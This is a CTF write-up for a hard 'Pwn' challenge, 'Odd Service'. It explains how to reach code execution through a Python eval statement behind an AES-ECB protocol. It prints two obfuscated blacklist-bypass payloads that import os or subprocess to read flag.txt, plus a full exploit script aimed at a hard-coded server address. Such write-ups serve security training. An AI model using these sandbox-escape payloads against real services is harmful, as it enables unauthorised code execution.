<img src="https://raw.githubusercontent.com/CTFae/media/main/brand/YT-banner.jpg" />

### Challenge: Odd Service
### Category: Pwn
### Difficulty: Hard
<hr>

#### Challenge Description
This challenge will need users to communicate securely with a service, fingerprint it to figure out where they are (python eval) then bypass a sandbox to achieve code execution.

#### Challenge Screenshot
![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/odd_service-1.png)

#### Solution
After the player figures out the encryption and writes code to securely communicate with the server, the player will be met with the following message:

![step_1](https://raw.githubusercontent.com/CTFae/media/main/writeups/odd_service-2.png)

Through trial and error, the player should find out they are inside a python eval statement. However, trying to execute an obvious payload such as `system(“ls -la”)` will realize that there is a blacklist put in place.

However, this blacklist is not so complicated and can be bypassed in different ways. Here are two possible payloads:

```py
__builtins__.__dict__['__imp'+'ort__']('o'+'s').__dict__['popen']('/bin/cat flag.txt').read()
```

or

```py
__builtins__.__dict__[standard_b64decode('X19pbXBvcnRfXw==').decode('utf-8')](standard_b64decode('c3VicHJvY2Vzcw==').decode('utf-8')).__dict__['check_output'](['cat','flag.txt']).decode('utf-8')
```

Note that the use of `system()` will not work as a valid payload because it does not return output.

After the user encrypts this payload, sends it and decrypts the response they will be able to achieve code execution and therefore extract the flag.

#### Exploit Screenshot
![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/odd_service-3.png)


#### Exploit Script
```py
import socket
import random
import string
import re
from base64 import standard_b64decode
from base64 import standard_b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import struct

HOST, PORT = "52.170.158.124", 1337

def decrypt(msg, key):
    decoded = standard_b64decode(msg)
    cipher = AES.new(key.encode('utf-8'), AES.MODE_ECB)
    return unpad(cipher.decrypt(decoded), 32).decode('utf-8')

def encrypt(msg, key):
    padded = pad(msg.encode('utf-8'), 32)
    cipher = AES.new(key.encode('utf-8'), AES.MODE_ECB)
    return standard_b64encode(cipher.encrypt(padded))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    # Connect to server and send data
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 1, 0))
    sock.connect((HOST, PORT))
    received = str(sock.recv(1024), "utf-8")
    key = re.search("'(.*)'", received).group(1)
    print("Key: {}".format(key))

    # Let's grab the hello message
    msg = str(sock.recv(1024), "utf-8")
    print("Msg: {}".format(msg))

    # # Decrypt it
    hello_msg_decoded = decrypt(msg, key)
    print("Decoded hello message: {}".format(hello_msg_decoded))

    # Okay now we can send input
    print("Sending payload...")
    #sock.sendall(encrypt("__builtins__.__dict__[standard_b64decode('X19pbXBvcnRfXw==').decode('utf-8')](standard_b64decode('c3VicHJvY2Vzcw==').decode('utf-8')).__dict__['check_output'](['cat','flag.txt']).decode('utf-8')", key))
    sock.sendall(encrypt("__builtins__.__dict__['__imp'+'ort__']('o'+'s').__dict__['popen']('/bin/cat flag.txt').read()", key))
    msg = str(sock.recv(1024), "utf-8")
    print("Recieving response...")
    print(decrypt(msg, key))
```

<hr>

&copy; <a href="https://ctf.ae" target=_blank>CTF.ae</a>
